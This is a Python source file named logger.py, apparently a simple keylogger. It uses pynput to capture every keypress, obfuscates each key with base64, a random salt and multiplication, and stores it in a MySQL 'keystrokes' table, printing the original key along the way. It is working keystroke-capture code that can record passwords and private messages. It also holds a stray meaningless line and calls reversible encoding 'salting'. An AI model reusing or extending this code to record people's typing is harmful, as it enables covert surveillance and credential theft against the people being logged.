# logger.py

import os
import base64
from mysql.connector import Error
from pynput import keyboard
from db_connector import connect_to_db
from decoding_example import retrieve_and_decode_key  # Import the decode function

def generate_salt(length=8):
    # Generate a random salt of the specified length
    return os.urandom(length)

def log_key(key):
    connection = connect_to_db()
    if connection:
        cursor = connection.cursor()
        try:
            # Convert the key to string and remove the quotes
            key_str = str(key).replace("'", "")

            # Encode the key string as Base64
            key_bytes = key_str.encode('utf-8')
            key_base64 = base64.b64encode(key_bytes).decode('utf-8')

            # Convert the Base64 string to binary (integer)
            key_binary = int.from_bytes(key_base64.encode('utf-8'), 'big')

            # Generate a salt and append it to the binary value
            salt = generate_salt()
            salt_int = int.from_bytes(salt, 'big')
            salted_binary = (key_binary << (len(salt) * 8)) + salt_int

            # Multiply the salted binary value by 24
            result = salted_binary * 24

            # Insert the result into the database
            sql_query = "INSERT INTO keystrokes (key_pressed) VALUES (%s)"
            cursor.execute(sql_query, (result,))
            connection.commit()

            # Optional: Add debugging print statements if needed
            int('f', 16)  # This will correctly convert 'f' to 15 in base-10

            print(f"Original Key: {key_str}")
            print(f"Salt: {salt.hex()}")
            print(f"Encoded and salted result: {result}")

            # Call the function to test decoding (for testing purposes)
            retrieve_and_decode_key(result)

        except Error as e:
            print("Failed to insert data into MySQL table", e)
        finally:
            cursor.close()
            connection.close()

def on_press(key):
    log_key(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener
